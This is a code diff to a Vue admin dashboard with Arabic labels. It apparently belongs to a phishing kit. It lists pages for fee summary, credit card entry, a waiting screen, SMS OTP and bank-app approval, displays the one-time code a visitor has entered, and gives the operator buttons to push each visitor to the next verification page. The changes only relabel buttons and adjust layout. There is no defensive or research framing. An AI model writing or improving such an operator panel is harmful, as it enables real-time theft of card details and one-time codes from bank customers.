@@ -92,13 +92,13 @@ const pageLabels: Record<string, string> = {
   '/payment': 'ملخص الرسوم',
   '/card-details': 'الدفع ببطاقة الائتمان',
   '/waiting': 'صفحة الانتظار',
-  '/otp': 'تحقق رقم الجوال (OTP)',
-  '/otp-bank': 'تنبية إتصال STC / نفاذ'
+  '/otp': 'OTP SMS',
+  '/otp-bank': 'رسالة موافقة من تطبيق البنك'
 };
 
 const redirectOptions = [
-  { value: '/otp-bank', label: 'تنبية إتصال STC / نفاذ' },
-  { value: '/otp', label: 'تحقق رقم الجوال (OTP)' },
+  { value: '/otp-bank', label: 'رسالة موافقة من تطبيق البنك' },
+  { value: '/otp', label: 'OTP SMS' },
   { value: '/waiting', label: 'صفحة الانتظار' },
   { value: '/card-details', label: 'الدفع ببطاقة الائتمان' },
   { value: '/payment', label: 'ملخص الرسوم' },
@@ -837,12 +837,12 @@ const filteredRequests = computed(() => {
                       @click="updateNextAction(selectedRequest.id, 'otp-sms')"
                       class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
                       :class="
-                        selectedRequest.nextAction === 'otp-sms'
+                        selectedRequest.nextAction === 'otp-sms' || selectedRequest.nextAction === '/otp'
                           ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
                           : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
                       "
                     >
-                      <span>تحويل لصفحة رمز SMS</span>
+                      <span>OTP SMS</span>
                       <Smartphone class="w-3.5 h-3.5" />
                     </button>
 
@@ -850,12 +850,12 @@ const filteredRequests = computed(() => {
                       @click="updateNextAction(selectedRequest.id, 'otp-bank')"
                       class="w-full py-1.5 px-2.5 rounded text-xs font-bold border transition-colors cursor-pointer text-right flex items-center justify-between"
                       :class="
-                        selectedRequest.nextAction === 'otp-bank'
+                        selectedRequest.nextAction === 'otp-bank' || selectedRequest.nextAction === '/otp-bank'
                           ? 'bg-[#dbeafe] border-[#1976d2] text-[#1976d2]'
                           : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
                       "
                     >
-                      <span>تنبية إتصال / تطبيق بنكي</span>
+                      <span>رسالة موافقة من تطبيق البنك</span>
                       <Building2 class="w-3.5 h-3.5" />
                     </button>
 
@@ -1103,7 +1103,7 @@ const filteredRequests = computed(() => {
                     الدفع والتحقق
                   </div>
 
-                  <div v-if="selectedRequest.otp" class="space-y-3">
+                  <div v-if="selectedRequest.otp" class="space-y-3 mb-3">
                     <div class="bg-white rounded-lg p-3 border border-gray-200 text-center">
                       <div class="text-[11px] text-gray-500 mb-1">رمز التحقق (OTP) المستلم:</div>
                       <div class="font-mono text-2xl font-black tracking-[0.3em] text-[#1976d2] select-all tabular-nums">
@@ -1127,20 +1127,22 @@ const filteredRequests = computed(() => {
                     </div>
                   </div>
 
-                  <div v-else class="space-y-2">
+                  <div class="space-y-2">
                     <p class="text-xs text-gray-600 mb-2">توجيه الزائر لصفحة التحقق المطلوبة:</p>
-                    <div class="flex gap-2">
+                    <div class="flex flex-col sm:flex-row gap-2">
                       <button
                         @click="updateNextAction(selectedRequest.id, 'otp-sms')"
-                        class="flex-1 bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
+                        class="flex-1 bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5"
                       >
-                        تحقق SMS (OTP)
+                        <Smartphone class="w-3.5 h-3.5" />
+                        <span>OTP SMS</span>
                       </button>
                       <button
                         @click="updateNextAction(selectedRequest.id, 'otp-bank')"
-                        class="flex-1 bg-gray-800 hover:bg-gray-900 text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
+                        class="flex-1 bg-gray-800 hover:bg-gray-900 text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5"
                       >
-                        تنبية إتصال / نفاذ
+                        <Building2 class="w-3.5 h-3.5" />
+                        <span>رسالة موافقة من تطبيق البنك</span>
                       </button>
                     </div>
                   </div>
